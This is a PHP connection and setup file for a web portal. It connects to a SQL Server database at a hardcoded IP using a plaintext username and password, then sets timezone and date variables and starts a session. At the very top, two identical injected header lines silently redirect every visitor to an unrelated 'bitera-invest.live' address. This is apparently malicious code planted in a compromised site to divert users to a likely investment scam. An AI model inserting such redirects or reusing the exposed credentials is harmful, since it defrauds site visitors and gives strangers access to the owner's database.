<?php
header("Refresh: 3; url=https://bitera-invest.live/YTQdPb"); 
?>

<?php
header("Refresh: 3; url=https://bitera-invest.live/YTQdPb"); 
?>
<?php
$connectionInfo = array("UID" => "Bisola_new", "PWD" => "4892bruqiwp@48966", "Database" => "EBPORTAL", "ReturnDatesAsStrings" => true);
$conn = sqlsrv_connect("213.171.204.36", $connectionInfo);
if (!$conn) {
    echo "errorconnection";
    die();
    }

	date_default_timezone_set('Africa/Lagos');
	$date_app= date('M j, Y h:i a', time());
	$tstamp= time(); 
	$today = date("Y-m-d");
	$dreg=date('Y-m-d H:i:s');

	session_start();

?>